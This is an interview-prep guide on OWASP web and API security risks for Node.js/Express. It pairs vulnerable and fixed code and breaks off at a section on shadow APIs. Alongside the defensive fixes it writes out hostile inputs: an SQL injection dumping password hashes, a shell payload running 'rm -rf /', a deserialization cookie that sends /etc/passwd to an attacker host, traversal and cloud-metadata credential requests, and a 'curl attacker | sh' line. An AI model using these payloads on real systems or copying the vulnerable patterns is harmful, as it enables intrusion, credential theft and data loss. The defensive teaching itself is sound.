# OWASP Top 10 & API Security for Node.js/Express — Senior/Staff Interview Prep

As a Forward Deployed Engineer you inherit whatever the customer already shipped, then attach it to *your* data and credentials. That makes you the person who has to spot a mass-assignment bug in their onboarding endpoint at 11pm, explain to their CISO why their internal API leaks other tenants' invoices, and patch it without a two-week refactor. This document maps the **OWASP Top 10 (2021)** and the **OWASP API Security Top 10 (2023)** onto concrete Node.js/Express failures, with a `// VULNERABLE` → `// FIXED` pair for every class of bug so you can pattern-match in a code review or a whiteboard. The framing is defensive throughout: know the exploit well enough to kill it, not to run it.

---

## The two lists at a glance

**OWASP Top 10 (2021)** — web application risks:

| ID  | Name | One-line meaning |
|-----|------|------------------|
| A01 | Broken Access Control | User can act outside intended permissions (IDOR, missing authz). |
| A02 | Cryptographic Failures | Sensitive data exposed via weak/absent crypto (was "Sensitive Data Exposure"). |
| A03 | Injection | SQL/NoSQL/OS/LDAP command interpreted as code; **XSS folded in here in 2021**. |
| A04 | Insecure Design | Missing threat modeling; the flaw is architectural, not a bug. |
| A05 | Security Misconfiguration | Default creds, verbose errors, open buckets, missing headers. |
| A06 | Vulnerable & Outdated Components | Known-CVE dependencies (supply chain). |
| A07 | Identification & Authentication Failures | Broken login, weak sessions, credential stuffing. |
| A08 | Software & Data Integrity Failures | Insecure deserialization, unsigned updates, CI/CD tampering. |
| A09 | Security Logging & Monitoring Failures | You can't detect or investigate a breach. |
| A10 | Server-Side Request Forgery (SSRF) | Server is tricked into making attacker-chosen requests. |

**OWASP API Security Top 10 (2023)** — API-specific risks:

| ID    | Name |
|-------|------|
| API1  | Broken Object Level Authorization (BOLA/IDOR) |
| API2  | Broken Authentication |
| API3  | Broken Object Property Level Authorization (mass assignment + excessive data exposure) |
| API4  | Unrestricted Resource Consumption |
| API5  | Broken Function Level Authorization |
| API6  | Unrestricted Access to Sensitive Business Flows |
| API7  | Server-Side Request Forgery |
| API8  | Security Misconfiguration |
| API9  | Improper Inventory Management (shadow/zombie APIs) |
| API10 | Unsafe Consumption of APIs |

**Interview trap:** interviewers love to ask "where did XSS go in 2021?" The answer: it was merged into **A03: Injection**. And "what's the #1 web risk in 2021?" — **A01 Broken Access Control**, which jumped from #5, because it's the most common and most impactful real-world failure. For APIs, the equivalent #1 is **API1 BOLA**.

---

### Q1. What is Broken Object Level Authorization (BOLA / IDOR), and why is it the #1 API risk?

**Answer:**
BOLA (also called IDOR — Insecure Direct Object Reference) happens when an endpoint accepts an object ID from the client and returns/mutates that object **without checking the caller actually owns it**. Authentication passes (you're a valid user), but authorization on the *specific object* is missing. It's #1 because APIs are essentially "give me object N" machines, IDs are guessable/enumerable, and the check is trivially easy to forget on the fifth endpoint that touches the same resource.

```typescript
// VULNERABLE — any authenticated user can read any invoice by guessing the id
app.get('/api/invoices/:id', requireAuth, async (req, res) => {
  const invoice = await Invoice.findById(req.params.id);
  if (!invoice) return res.status(404).json({ error: 'not found' });
  res.json(invoice); // no ownership check — GET /api/invoices/1001 leaks tenant B's data
});
```

```typescript
// FIXED — scope the query by the authenticated user/tenant, not just the id
app.get('/api/invoices/:id', requireAuth, async (req, res) => {
  const invoice = await Invoice.findOne({
    _id: req.params.id,
    tenantId: req.user.tenantId, // authorization is part of the query
  });
  // 404 (not 403) so we don't confirm the id exists to an attacker
  if (!invoice) return res.status(404).json({ error: 'not found' });
  res.json(invoice);
});
```

**Interview trap:** returning **403** on someone else's object confirms it exists (an enumeration oracle). Prefer **404** so a wrong ID and a forbidden ID look identical. Also: don't rely on UUIDs as your only defense — "unguessable IDs" is obscurity, not authorization. UUIDs leak in URLs, logs, and referrers.

**Production war story:** a fintech customer had `GET /api/v1/statements/:id` correctly scoped, but their new `GET /api/v2/statements/:id/pdf` endpoint — added by a different team — only checked auth, not ownership. Same object, second door, no lock. We caught it because the v2 handler called `Statement.findById` directly instead of the repository method that enforced tenant scope. The fix was a lint rule banning raw `findById` in route handlers.

---

### Q2. How do you prevent SQL injection in a Node.js app?

**Answer:**
Never build SQL by concatenating user input. Use **parameterized queries / prepared statements** so the driver sends the query text and the values on separate channels — user data can never be reinterpreted as SQL. This is A03 Injection.

```typescript
// VULNERABLE — string interpolation; input `' OR '1'='1` returns every row
app.get('/api/users', async (req, res) => {
  const q = `SELECT id, email FROM users WHERE email = '${req.query.email}'`;
  const rows = await pool.query(q);
  res.json(rows);
});
// exploit: /api/users?email=' UNION SELECT password_hash, email FROM users --
```

```typescript
// FIXED — parameterized query; the driver escapes/binds the value
app.get('/api/users', async (req, res) => {
  const rows = await pool.query(
    'SELECT id, email FROM users WHERE email = $1', // pg placeholder
    [req.query.email],
  );
  res.json(rows.rows);
});
```

**Interview trap:** ORMs are *not* automatically safe. `sequelize.query(`...${x}...`)`, `knex.raw(`...${x}...`)`, and dynamic `ORDER BY ${col}` all reopen the hole because column/table names can't be bound as parameters. For dynamic identifiers, **allowlist** them:

```typescript
// FIXED — allowlist identifiers that cannot be parameter-bound
const SORTABLE = new Set(['created_at', 'email', 'name']);
const sortCol = SORTABLE.has(req.query.sort as string) ? req.query.sort : 'created_at';
const rows = await pool.query(`SELECT * FROM users ORDER BY ${sortCol} LIMIT 50`);
```

---

### Q3. What is NoSQL / MongoDB operator injection and how do you stop it?

**Answer:**
MongoDB queries are objects. If you pass `req.body` straight into a query and the client sends a **query operator** (`$ne`, `$gt`, `$regex`, `$where`) instead of a scalar, they can rewrite your query logic. The classic auth bypass: submit `{ "password": { "$ne": null } }` and the query matches any user with a non-null password.

```typescript
// VULNERABLE — body values become query operators
app.post('/api/login', async (req, res) => {
  // client sends: { "email": {"$ne": null}, "password": {"$ne": null} }
  const user = await User.findOne({
    email: req.body.email,
    password: req.body.password, // matches the first user in the collection
  });
  if (user) return res.json({ token: sign(user) }); // logged in as someone else
  res.status(401).json({ error: 'invalid' });
});
```

```typescript
// FIXED — coerce to strings, hash-compare, and sanitize objects
import mongoSanitize from 'express-mongo-sanitize';
app.use(mongoSanitize()); // strips keys starting with $ or containing .

app.post('/api/login', async (req, res) => {
  const email = String(req.body.email ?? '');
  const password = String(req.body.password ?? ''); // {$ne:null} -> "[object Object]"
  const user = await User.findOne({ email }).select('+passwordHash');
  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
    return res.status(401).json({ error: 'invalid credentials' });
  }
  res.json({ token: sign(user) });
});
```

**Interview trap:** the two-part fix is (1) **type coercion / schema validation** (zod, joi) so `email` must be a `string`, and (2) never store or compare plaintext passwords — a proper `bcrypt.compare` neutralizes the `$ne` trick even before sanitization because you're comparing against a hash, not letting Mongo evaluate the operator. `express-mongo-sanitize` is defense-in-depth, not the primary fix.

---

### Q4. Explain command injection and the difference between `exec` and `execFile`.

**Answer:**
`child_process.exec` runs its argument **through a shell** (`/bin/sh -c`), so shell metacharacters (`;`, `|`, `&&`, `` ` ``, `$()`) in user input become new commands. `execFile`/`spawn` (without `shell: true`) invoke the binary directly with an **argument array** — no shell parsing — so input is passed as literal argv and can't spawn new processes.

```typescript
// VULNERABLE — user input reaches the shell
import { exec } from 'child_process';
app.get('/api/ping', (req, res) => {
  // /api/ping?host=8.8.8.8; rm -rf / --no-preserve-root
  exec(`ping -c 1 ${req.query.host}`, (err, stdout) => res.send(stdout));
});
```

```typescript
// FIXED — execFile with an argument array + input validation
import { execFile } from 'child_process';
import net from 'net';
app.get('/api/ping', (req, res) => {
  const host = String(req.query.host ?? '');
  // validate shape before it ever reaches a process boundary
  if (!net.isIP(host)) return res.status(400).json({ error: 'invalid host' });
  execFile('ping', ['-c', '1', host], { timeout: 5000 }, (err, stdout) => {
    if (err) return res.status(500).json({ error: 'ping failed' });
    res.send(stdout);
  });
});
```

**Interview trap:** `execFile('bash', ['-c', userInput])` and `spawn(cmd, args, { shell: true })` re-introduce the shell and are just as dangerous as `exec`. The safety comes from *no shell*, not from the function name.

---

### Q5. What are the components of broken authentication (A07 / API2), and how do you build a robust login?

**Answer:**
Authentication failures include: allowing weak/breached passwords, no brute-force protection, credential stuffing, session tokens that don't expire or rotate, JWTs with `alg: none` or a guessable secret, and putting secrets in URLs. A robust flow: strong hashing (bcrypt/argon2), constant-time comparison, rate limiting + lockout, short-lived access tokens with refresh rotation, and secure cookie flags.

```typescript
// VULNERABLE — plaintext compare, MD5, no throttling, secret in query
app.post('/login', async (req, res) => {
  const user = await User.findOne({ email: req.body.email });
  if (user && user.password === md5(req.body.password)) { // fast hash, timing leak
    res.redirect(`/dashboard?token=${user.apiToken}`); // token in URL -> logs, history
  }
});
```

```typescript
// FIXED — argon2, generic errors, short-lived JWT in httpOnly cookie
import argon2 from 'argon2';
app.post('/login', loginLimiter, async (req, res) => {
  const { email, password } = loginSchema.parse(req.body); // zod: strings, length
  const user = await User.findOne({ email }).select('+passwordHash');
  // always run a hash compare (even on missing user) to avoid a timing oracle
  const ok = user
    ? await argon2.verify(user.passwordHash, password)
    : await argon2.verify(DUMMY_HASH, password).then(() => false);
  if (!ok) return res.status(401).json({ error: 'invalid credentials' }); // generic
  const token = jwt.sign({ sub: user.id }, process.env.JWT_SECRET!, {
    algorithm: 'HS256', // pin the algorithm — never accept 'none'
    expiresIn: '15m',
  });
  res.cookie('access', token, { httpOnly: true, secure: true, sameSite: 'strict' });
  res.json({ ok: true });
});
```

**Interview trap:** when verifying JWTs, **always pin `algorithms: ['HS256']`** (or your RS256) in `jwt.verify`. If you don't, an attacker can send `alg: none` or swap RS256→HS256 and sign with your *public* key as the HMAC secret.

---

### Q6. What is Server-Side Request Forgery (SSRF) and the cloud metadata attack?

**Answer:**
SSRF (A10 / API7) is when your server fetches a URL supplied by the user, and the attacker points it at something *they* shouldn't reach — internal services, `localhost`, or the cloud **instance metadata endpoint** `169.254.169.254`. On AWS with **IMDSv1**, a single GET to that address returns temporary IAM role credentials. The attacker exfiltrates them and now has your instance's permissions.

```
   Attacker                Your API (SSRF)              AWS Metadata (IMDSv1)
      |                          |                              |
      |  POST /fetch-avatar      |                              |
      |  { url: "http://169.254.169.254/latest/meta-data/       |
      |         iam/security-credentials/app-role" }            |
      |------------------------->|                              |
      |                          |   GET /latest/meta-data/...  |
      |                          |----------------------------->|
      |                          |   AccessKeyId, SecretKey,    |
      |                          |<-----------------------------|
      |                          |         SessionToken         |
      |  200 { ...credentials }  |                              |
      |<-------------------------|                              |
      |  --> attacker now calls AWS APIs as your instance role  |
```

```typescript
// VULNERABLE — fetches any URL the user supplies
app.post('/api/fetch-avatar', async (req, res) => {
  const resp = await fetch(req.body.url); // SSRF: url = http://169.254.169.254/...
  res.type('image/png').send(Buffer.from(await resp.arrayBuffer()));
});
```

```typescript
// FIXED — allowlist scheme+host, resolve DNS, block private ranges, no redirects
import dns from 'dns/promises';
import net from 'net';
import ipaddr from 'ipaddr.js';

const ALLOWED_HOSTS = new Set(['images.cdn.example.com']);

function isPublicUnicast(ip: string): boolean {
  const addr = ipaddr.parse(ip);
  const range = addr.range(); // 'private', 'loopback', 'linkLocal', 'unicast'...
  return range === 'unicast'; // rejects loopback, private, linkLocal (169.254.x)
}

app.post('/api/fetch-avatar', async (req, res) => {
  let url: URL;
  try { url = new URL(req.body.url); } catch { return res.status(400).end(); }
  if (url.protocol !== 'https:') return res.status(400).json({ error: 'https only' });
  if (!ALLOWED_HOSTS.has(url.hostname)) return res.status(400).json({ error: 'host not allowed' });

  // resolve and validate the ACTUAL ip to defeat DNS rebinding
  const { address } = await dns.lookup(url.hostname);
  if (!isPublicUnicast(address)) return res.status(400).json({ error: 'blocked ip' });

  const resp = await fetch(url, { redirect: 'error' }); // don't follow redirects to internal
  res.type('image/png').send(Buffer.from(await resp.arrayBuffer()));
});
```

**Interview trap:** an allowlist of *hostnames* alone is bypassable via **DNS rebinding** — the attacker's domain resolves to a public IP during your check, then flips to `169.254.169.254` on the actual fetch (TTL 0). The robust defenses are: resolve the IP and validate *that*, pin the connection to the validated IP, disable redirects, and — critically — **enforce IMDSv2** at the infrastructure level (session-token required, so a blind GET no longer returns creds), plus a hop-limit of 1 so containers can't reach it.

**Production war story:** a customer's PDF-generation service accepted a `headerImageUrl`. Someone pointed it at `http://169.254.169.254/latest/meta-data/iam/security-credentials/` and rendered the IAM creds *into the PDF*, then downloaded it. IMDSv1 was still enabled. The remediation was three-layered: (1) `HttpTokens=required` (IMDSv2) via instance metadata options, (2) the allowlist + IP validation above, and (3) scoping the instance role down to exactly one S3 bucket so stolen creds were near-worthless.

---

### Q7. What is insecure deserialization in Node.js, and why is `node-serialize` dangerous?

**Answer:**
Insecure deserialization (A08) is when untrusted bytes are turned back into objects and, in the process, code runs. In Node, `JSON.parse` is *data-only* and safe from RCE — but libraries like **`node-serialize`** and `serialize-javascript` (when misused) will deserialize an **immediately-invoked function expression** embedded in the payload, giving remote code execution.

```typescript
// VULNERABLE — node-serialize unserialize executes embedded functions
import { unserialize } from 'node-serialize';
app.use((req, res, next) => {
  const cookie = req.cookies.session;
  if (cookie) req.session = unserialize(cookie); // RCE if cookie contains _$$ND_FUNC$$_
  next();
});
// exploit cookie payload:
// {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl attacker/$(cat /etc/passwd)')}()"}
```

```typescript
// FIXED — never deserialize behavior; use signed, JSON-only sessions
import jwt from 'jsonwebtoken';
app.use((req, res, next) => {
  const cookie = req.cookies.session;
  if (cookie) {
    try {
      // JWT is signed + JSON.parse under the hood — data only, no code execution
      req.session = jwt.verify(cookie, process.env.SESSION_SECRET!, { algorithms: ['HS256'] });
    } catch { /* invalid/tampered — ignore */ }
  }
  next();
});
```

**Interview trap:** `JSON.parse` won't run code, but it can still cause **prototype pollution** if you later merge the parsed object into another (see next question), and a malicious `reviver` you write can be exploited. The rule: deserialize *data* with `JSON.parse`, verify integrity with a signature (JWT/HMAC), and never use a library that round-trips functions.

---

### Q8. Explain prototype pollution in Node.js with a concrete auth-bypass exploit and the fix.

**Answer:**
JavaScript objects share a prototype chain. If attacker-controlled keys like `__proto__`, `constructor`, or `prototype` reach a **recursive merge / deep-clone / `set`-by-path** function, the attacker can write onto `Object.prototype` — a property that then appears on *every* object in the process. Combined with a "gadget" (code that reads `obj.someFlag` and treats a truthy value as permission), this becomes an auth bypass or RCE.

```
  { "__proto__": { "isAdmin": true } }   <-- attacker JSON body
             |
             v   merge(target, req.body)   (recursive, no key guard)
     Object.prototype.isAdmin = true
             |
             v   later: if (user.isAdmin) grantAdmin()
     EVERY object, including {} sessions, now reports isAdmin === true
             |
             v   auth bypass — attacker is admin, so is everyone
```

```typescript
// VULNERABLE — recursive merge with no key guard pollutes Object.prototype
function merge(target: any, source: any) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]); // walks into __proto__
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

app.post('/api/profile', requireAuth, (req, res) => {
  const prefs = merge({}, req.body); // body: {"__proto__":{"isAdmin":true}}
  // ...
  res.json({ ok: true });
});

// gadget elsewhere — inherits polluted prop because req.user has no own 'isAdmin'
app.get('/api/admin', requireAuth, (req, res) => {
  if (req.user.isAdmin) return res.json({ secret: 'flag' }); // now true for everyone
  res.status(403).end();
});
```

```typescript
// FIXED — guard dangerous keys, use null-prototype objects, and hasOwnProperty checks
const FORBIDDEN = new Set(['__proto__', 'constructor', 'prototype']);

function safeMerge(target: any, source: any) {
  for (const key of Object.keys(source)) {          // Object.keys skips inherited
    if (FORBIDDEN.has(key)) continue;                // reject the gadget keys
    if (!Object.prototype.hasOwnProperty.call(source, key)) continue;
    const val = source[key];
    if (val && typeof val === 'object' && !Array.isArray(val)) {
      target[key] = safeMerge(Object.create(null), val); // null-proto: no chain to pollute
    } else {
      target[key] = val;
    }
  }
  return target;
}

app.post('/api/profile', requireAuth, (req, res) => {
  const prefs = safeMerge(Object.create(null), req.body);
  res.json({ ok: true });
});

// belt-and-suspenders: freeze the prototype at boot so pollution throws in strict mode
Object.freeze(Object.prototype);
```

**Interview trap:** the most robust fixes people forget: (1) `JSON.parse(str, reviver)` where the reviver drops `__proto__` keys, (2) use a **`Map`** instead of a plain object for user-keyed data (Maps have no prototype-key confusion), (3) `Object.create(null)` for lookup dictionaries, and (4) at the *design* level, parse-and-validate with **zod** into a fixed shape so unknown keys never survive. `Object.freeze(Object.prototype)` is a strong process-wide backstop but can break libraries that (badly) extend prototypes — test it.

---

### Q9. Does an API that only returns JSON still need to worry about XSS?

**Answer:**
Yes. XSS (folded into A03) is still in scope for APIs in three ways: (1) **reflected in JSON** that a browser might sniff and render as HTML, (2) **stored XSS** where your API stores `<script>` and a downstream SPA renders it via `innerHTML`/`dangerouslySetInnerHTML`, and (3) content-type/MIME sniffing where a browser ignores your intended type. The API is the storage and transport layer for a payload that executes elsewhere — output encoding and correct headers are still your job.

```typescript
// VULNERABLE — reflects HTML, wrong content type, sniffable
app.get('/api/search', (req, res) => {
  const q = req.query.q as string;
  res.send(`<h1>Results for ${q}</h1>`); // reflected XSS: q=<script>...
  // and stored comments returned raw for the SPA to innerHTML
});
```

```typescript
// FIXED — JSON only, correct content type, nosniff, encode on store or render
app.get('/api/search', (req, res) => {
  res.set('X-Content-Type-Options', 'nosniff'); // stop MIME sniffing
  res.json({ query: String(req.query.q ?? ''), results: [] }); // res.json escapes safely
});

// store sanitized HTML if you must accept rich text
import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';
const DOMPurify = createDOMPurify(new JSDOM('').window);

app.post('/api/comments', requireAuth, (req, res) => {
  const clean = DOMPurify.sanitize(String(req.body.body ?? ''), { ALLOWED_TAGS: ['b', 'i', 'a'] });
  // store `clean`; the SPA should still treat it as text unless rendering rich content
  res.json({ ok: true });
});
```

**Interview trap:** `res.json()` correctly serializes and the browser treats `application/json` as data — but only if you also send `X-Content-Type-Options: nosniff`. Without it, older/edge browsers may sniff a JSON response containing HTML and render it. And the *real* XSS defense for a JSON API + SPA is that the SPA must **never** `innerHTML` server data — React/Vue escape by default; the bug is always a `dangerouslySetInnerHTML`/`v-html`.

---

### Q10. What is mass assignment (API3) and how do you prevent it?

**Answer:**
Mass assignment is binding a whole request body onto a model, so the client can set fields you never intended — `role`, `isAdmin`, `emailVerified`, `balance`. The Node anti-pattern is `Object.assign(user, req.body)` or `new User(req.body)`. The fix is a **whitelist**: explicitly pick only the fields a user may set.

```typescript
// VULNERABLE — client controls every column, including role
app.patch('/api/users/:id/profile', requireAuth, async (req, res) => {
  const user = await User.findById(req.params.id);
  Object.assign(user, req.body); // body: { "name":"x", "role":"admin" }
  await user.save();
  res.json(user);
});
```

```typescript
// FIXED — validate + explicitly whitelist the allowed fields
import { z } from 'zod';
const profileSchema = z.object({
  name: z.string().min(1).max(80),
  bio: z.string().max(500).optional(),
}).strict(); // .strict() rejects unknown keys outright

app.patch('/api/users/:id/profile', requireAuth, async (req, res) => {
  if (req.params.id !== req.user.id) return res.status(404).end(); // + BOLA check
  const data = profileSchema.parse(req.body);      // only name/bio survive
  const user = await User.findByIdAndUpdate(
    req.user.id,
    { $set: { name: data.name, bio: data.bio } },  // never spread req.body
    { new: true, runValidators: true },
  ).select('name bio email');                       // + control output shape
  res.json(user);
});
```

**Interview trap:** API3 has two halves — **mass assignment** (client writes fields it shouldn't) and **excessive data exposure** (server returns fields it shouldn't, expecting the client to hide them). Both are "property-level authorization." Returning the full user document including `passwordHash`, `resetToken`, and `stripeCustomerId` and letting the frontend "just not display them" is the exposure half. Always `.select()`/serialize an explicit output DTO.

---

### Q11. What is ReDoS (catastrophic backtracking) and how do you defend against it?

**Answer:**
Regular Expression Denial of Service happens when a regex with **nested/overlapping quantifiers** (e.g. `(a+)+$`, `(\d+)*`) is fed a crafted string that forces exponential backtracking. One request pegs the single Node event loop at 100% CPU and the whole service stalls. It's a form of A04/API4 unrestricted resource consumption.

```typescript
// VULNERABLE — evil regex; input "aaaa...!" causes exponential backtracking
const EMAIL = /^([a-zA-Z0-9]+)+@example\.com$/; // nested quantifier
app.post('/api/subscribe', (req, res) => {
  if (!EMAIL.test(req.body.email)) return res.status(400).end(); // hangs on 30 'a's + '!'
  res.json({ ok: true });
});
```

```typescript
// FIXED — linear-time engine (re2) + length cap + a safe pattern
import RE2 from 're2';
const EMAIL = new RE2(/^[a-zA-Z0-9._%+-]+@example\.com$/); // no nested quantifiers
app.post('/api/subscribe', (req, res) => {
  const email = String(req.body.email ?? '');
  if (email.length > 254) return res.status(400).json({ error: 'too long' }); // cap input
  if (!EMAIL.test(email)) return res.status(400).json({ error: 'invalid' });
  res.json({ ok: true });
});
```

**Interview trap:** `re2` is a Google library with **guaranteed linear time** (no backtracking) — the right choice for any regex touching user input. If you can't swap engines, options are: cap input length, rewrite the pattern to remove ambiguity, run the match with a timeout in a worker thread, or lint with a tool like `redos-detector`/`safe-regex`. Note `re2` doesn't support backreferences/lookbehind — if your pattern needs those, it's already suspect.

---

### Q12. How do you prevent path traversal in a file-serving endpoint?

**Answer:**
Path traversal (part of A01/A05) is using `../` sequences to escape the intended directory and read arbitrary files (`../../etc/passwd`, `..\\..\\windows\\win.ini`). The fix: resolve the full path and verify it still lives under the allowed base directory — string checks for `..` alone are bypassable (URL-encoding, absolute paths).

```typescript
// VULNERABLE — user filename joined directly into a path
app.get('/api/files/:name', (req, res) => {
  res.sendFile(path.join('/var/app/uploads', req.params.name));
  // /api/files/..%2f..%2f..%2fetc%2fpasswd
});
```

```typescript
// FIXED — resolve, then verify the resolved path is inside the base dir
import path from 'path';
const BASE = path.resolve('/var/app/uploads');
app.get('/api/files/:name', (req, res) => {
  const resolved = path.resolve(BASE, req.params.name);
  // path.relative escaping upward starts with '..' or is absolute -> reject
  const rel = path.relative(BASE, resolved);
  if (rel.startsWith('..') || path.isAbsolute(rel)) {
    return res.status(400).json({ error: 'invalid path' });
  }
  res.sendFile(resolved);
});
```

**Interview trap:** `path.normalize` alone does **not** prevent traversal — it just collapses `..`, it doesn't check the result is in-bounds. The correct primitive is: `path.resolve(BASE, userInput)` then confirm `resolved.startsWith(BASE + path.sep)` (or use `path.relative` as above). Also validate the filename against an allowlist charset (`/^[\w.\-]+$/`) as a first gate.

---

### Q13. How do you protect a login endpoint against brute force and credential stuffing (API4)?

**Answer:**
Layer three controls: **global rate limiting** (requests per IP), **per-account throttling / lockout** (failed attempts per username with exponential backoff), and **credential-stuffing defenses** (breached-password checks, CAPTCHA after N failures, MFA). IP-only limiting is weak against distributed attacks; account-level limiting is weak against username spraying — you need both.

```typescript
// VULNERABLE — no throttling; unlimited password guesses
app.post('/login', async (req, res) => {
  const user = await User.findOne({ email: req.body.email });
  if (user && await argon2.verify(user.passwordHash, req.body.password)) {
    return res.json({ token: sign(user) });
  }
  res.status(401).json({ error: 'invalid' });
});
```

```typescript
// FIXED — IP rate limit + per-account exponential lockout
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,                         // per-IP ceiling
  standardHeaders: true,
  legacyHeaders: false,
});

async function checkAccountLock(email: string): Promise<number> {
  const key = `login:fail:${email}`;
  const fails = Number((await redis.get(key)) ?? 0);
  // exponential backoff: 0..4 free, then 2^(n-4) seconds delay, cap at lockout
  if (fails >= 10) return 15 * 60; // 15-min lockout
  return fails > 4 ? Math.min(2 ** (fails - 4), 60) : 0;
}

app.post('/login', loginLimiter, async (req, res) => {
  const { email, password } = loginSchema.parse(req.body);
  const wait = await checkAccountLock(email);
  if (wait > 0) {
    res.set('Retry-After', String(wait));
    return res.status(429).json({ error: 'too many attempts', retryAfter: wait });
  }
  const user = await User.findOne({ email }).select('+passwordHash');
  const ok = user && (await argon2.verify(user.passwordHash, password));
  if (!ok) {
    await redis.multi().incr(`login:fail:${email}`).expire(`login:fail:${email}`, 900).exec();
    return res.status(401).json({ error: 'invalid credentials' });
  }
  await redis.del(`login:fail:${email}`); // reset on success
  res.json({ token: sign(user) });
});
```

**Interview trap:** rate-limit the *response*, not just the request — and put the counter in **Redis, not memory**, or it resets on deploy and doesn't work across multiple instances behind a load balancer. Also: if you're behind a proxy/ALB, set `app.set('trust proxy', 1)` so `express-rate-limit` keys on the real client IP from `X-Forwarded-For` instead of the proxy's IP (otherwise every user shares one bucket).

---

### Q14. What security headers should every Express API set, and what does helmet do?

**Answer:**
`helmet` sets a bundle of protective response headers. The important ones: **HSTS** (force HTTPS), **X-Content-Type-Options: nosniff** (stop MIME sniffing), **X-Frame-Options / frame-ancestors** (clickjacking), **Content-Security-Policy** (restrict where scripts/resources load from — the strongest XSS mitigation for anything that serves HTML), and removing `X-Powered-By` (don't advertise Express).

```typescript
// VULNERABLE — no headers; X-Powered-By: Express leaks the stack
const app = express();
app.get('/', (_req, res) => res.send('<h1>hi</h1>'));
```

```typescript
// FIXED — helmet with an explicit CSP and HSTS
import helmet from 'helmet';
app.disable('x-powered-by');
app.use(helmet({
  hsts: { maxAge: 31_536_000, includeSubDomains: true, preload: true }, // 1 year, HTTPS only
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],            // no inline scripts -> blocks most reflected XSS
      objectSrc: ["'none'"],
      frameAncestors: ["'none'"],       // clickjacking protection
      upgradeInsecureRequests: [],
    },
  },
}));
```

**Interview trap:** for a **pure JSON API** (no HTML), the highest-value headers are `nosniff`, HSTS, and a restrictive CSP like `default-src 'none'` (a JSON endpoint loads nothing). CSP's script directives matter most when you serve HTML. Don't blindly add `'unsafe-inline'` to `scriptSrc` — that defeats the entire point of CSP.

---

### Q15. How do you manage dependency and supply-chain risk (A06 / A08) in a Node project?

**Answer:**
Pin and verify: commit a **lockfile** (`package-lock.json`), install in CI with **`npm ci`** (installs exactly the lockfile, fails on drift — never `npm install` in CI), run **`npm audit`** and fail the build on high/critical, watch for **typosquatting** (`crossenv` vs `cross-env`), and neutralize malicious **`postinstall` scripts** with `--ignore-scripts` for packages that don't need them.

```bash
# VULNERABLE — non-reproducible, runs arbitrary install scripts, ignores CVEs
npm install                    # mutates lockfile, may pull newer transitive deps
# a typosquatted package's postinstall runs `curl attacker | sh` on your CI runner
```

```bash
# FIXED — reproducible, audited, scripts controlled
npm ci                         # exact lockfile install; errors if package.json drifts
npm audit --audit-level=high   # fail CI on high/critical CVEs
npm ci --ignore-scripts        # block lifecycle scripts; allowlist ones you truly need
```

```json
// package.json — enforce integrity and engine constraints
{
  "scripts": { "preinstall": "npx only-allow npm" },
  "overrides": { "vulnerable-transitive-dep": "1.2.4" }
}
```

**Interview trap:** `npm ci` vs `npm install` is a classic. `npm ci` requires an in-sync lockfile, wipes `node_modules`, and never writes the lockfile — that's what you want in CI and Docker builds for reproducibility. `npm install` can silently upgrade transitive deps and mutate the lockfile. Also mention `--ignore-scripts` (postinstall is a primary malware vector — the `event-stream`/`ua-parser-js` incidents), integrity hashes in the lockfile, and using something like Dependabot/Renovate + a lockfile diff review.

**Production war story:** a customer's Docker image build used `npm install`, so every rebuild resolved dependencies fresh. A compromised patch release of a deep transitive dependency shipped a `postinstall` that exfiltrated env vars during the build — and their build injected AWS creds as env vars. We switched them to `npm ci --ignore-scripts` with a vetted allowlist, moved secrets out of build-time env into runtime-only, and added `npm audit` as a blocking CI gate. The reproducible-build change alone would have prevented it.

---

### Q16. What is Broken Function Level Authorization (API5) and how does it differ from BOLA?

**Answer:**
BOLA (API1) is about *which objects* a user can access (horizontal — can I read *your* invoice?). BFLA (API5) is about *which functions/operations* a user can invoke (vertical — can a regular user call an **admin-only** endpoint?). It typically arises when authorization is enforced in the UI (the admin button is hidden) but not on the server, or when a role check is missing on a subset of routes.

```typescript
// VULNERABLE — admin route only "protected" by being unlinked in the UI
app.delete('/api/admin/users/:id', requireAuth, async (req, res) => {
  await User.findByIdAndDelete(req.params.id); // any logged-in user can call it
  res.json({ ok: true });
});
```

```typescript
// FIXED — explicit role/permission check on the server, per function
function requireRole(...roles: string[]) {
  return (req: Request, res: Response, next: NextFunction) => {
    if (!roles.includes(req.user.role)) return res.status(403).json({ error: 'forbidden' });
    next();
  };
}
app.delete('/api/admin/users/:id', requireAuth, requireRole('admin'), async (req, res) => {
  await User.findByIdAndDelete(req.params.id);
  res.json({ ok: true });
});
```

**Interview trap:** the giveaway in a code review is any route under `/admin` (or any mutating verb) that has `requireAuth` but no role/permission middleware. Enforce it with a **default-deny** pattern: a global middleware that requires an explicit permission declaration per route, so forgetting to add one fails closed, not open.

---

### Q17. What is excessive data exposure and how do you build safe API responses?

**Answer:**
Excessive data exposure (the read side of API3) is returning full internal objects and trusting the client to filter. Attackers just read the raw JSON response. The fix is **serialize explicitly** to a response DTO — never return a raw DB document.

```typescript
// VULNERABLE — returns the whole user doc, including secrets
app.get('/api/me', requireAuth, async (req, res) => {
  const user = await User.findById(req.user.id);
  res.json(user); // includes passwordHash, resetToken, mfaSecret, internalNotes
});
```

```typescript
// FIXED — explicit output DTO (allowlist, not blocklist)
function toUserDTO(u: UserDoc) {
  return { id: u.id, email: u.email, name: u.name, role: u.role, createdAt: u.createdAt };
}
app.get('/api/me', requireAuth, async (req, res) => {
  const user = await User.findById(req.user.id).select('email name role createdAt');
  if (!user) return res.status(404).end();
  res.json(toUserDTO(user)); // impossible to leak a field you didn't list
});
```

**Interview trap:** use an **allowlist DTO**, not a `delete user.passwordHash` blocklist. Blocklists rot — the day someone adds a `ssn` column, it leaks, because nobody updated the delete list. A `toDTO` allowlist fails safe: new fields are invisible until explicitly exposed.

---

### Q18. What is Improper Inventory Management (API9), i.e. shadow and zombie APIs?

**Answer:**
API9 is not knowing what APIs you have running. **Shadow APIs** are undocumented endpoints (a debug route, an internal tool) exposed to the internet. **Zombie APIs** are old versions (`/api/v1`) left running after `/api/v2` shipped — unpatched and forgotten. Attackers target the version you stopped watching.

```typescript
